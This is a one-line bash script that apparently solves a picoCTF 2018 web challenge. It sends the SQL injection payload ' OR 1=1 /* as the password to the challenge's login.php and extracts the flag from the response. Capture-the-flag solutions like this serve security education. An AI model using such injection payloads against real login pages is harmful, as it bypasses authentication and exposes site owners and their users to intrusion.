#!/bin/bash
curl --silent -XPOST http://2018shell.picoctf.com:22430/login.php -F password="' OR 1=1 /*" | grep -o "picoCTF{.*}" 
